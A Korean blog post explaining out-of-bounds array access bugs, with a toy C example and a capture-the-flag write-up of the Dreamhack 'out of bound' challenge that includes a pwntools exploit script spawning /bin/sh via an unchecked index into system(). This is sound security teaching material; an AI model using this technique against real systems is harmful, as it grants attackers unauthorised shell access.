---
tistoryBlogName: k0n9
tistoryTitle: out of bound
tistoryVisibility: "3"
tistoryCategory: "1136867"
tistorySkipModal: true
tistoryPostId: "36"
tistoryPostUrl: https://k0n9.tistory.com/36
---
## Out Of Boundary란?

배열의 범위를 벗어난 메모리에 접근할 수 있는 취약점으로 개발자가 인덱스에 대한 검사를 제대로 하지 않으면 발생한다. 임의의 주소 읽기, 쓰기로 이어질 수 있다.

## 예시

```c
#inlcude <stdio.h>

int main(){

	int a[10];
	printf("%p\\n", a);
	printf("%p\\n", &a[0]);

	printf("----\\n");
	printf("%p\\n", a[-1]);
	printf("%p\\n", a[100]);

	return 0;
}
```

a의 배열이 0부터 9까지 있지만 범위를 넘어서서 오프셋에 따른 메모리를 참조한다.
### 예제_Dreamhack_out of bound
보호기법 체크

![](https://i.imgur.com/Fd0AFDk.png)


32bit인것을 알 수 있다.

c코드

```c
char name[16];

char *command[10] = { "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };
int main()
{
    int idx;

    initialize();

    printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");

    scanf("%d", &idx);

    system(command[idx]);

    return 0;
}
```

중요한 부분만 가져왔다. scanf에서 idx에 대한 값을 검증하지 않으니 이부분을 노려보자. 우선 name에 /bin/sh를 입력하고 command에 idx값을 크게 줘서 name의 /bin/sh가 인자로 사용되면 된다.

```python
from pwn import *
import time

p = remote("host3.dreamhack.games", 12008)

name = 0x804a0ac

ex =  p32(name+4)
ex += b'/bin/sh'

p.sendafter("name: ", ex)
time.sleep(1)
p.sendafter("want?: ", b'19')

p.interactive()
```

전체 페이로드이다. 중요한 부분만 보자. 우선 name와 command의 차이는 79바이트이다.

![](https://i.imgur.com/rIBosmX.png)

32bit는 4바이트 64bit는 8바이트마다 1 인덱스이다. 79/4 = 19 즉. 19 인덱스 만큼 차이가 난다. 그래서 인덱스 값으로는 19를 준다. name에다가는 /bin/sh를 입력해야 하는데 여기서 중요한 점은 system 함수이다.

system(const char \*command); 의 형식을 가지고 있다. 즉 인자값으로 char 포인터를 받기 때문에 name에 name+4의 주소를 먼저 넣는다. 즉 0번인덱스가 1번 인덱스를 참조하게 되는 것이다. 그리고 1번 인덱스에 “/bin/sh”를 입력한다. 그러면 결과적으로 system(”/bin/sh”) 가 실행될 것이다.

![](https://i.imgur.com/DC6MdTC.png)
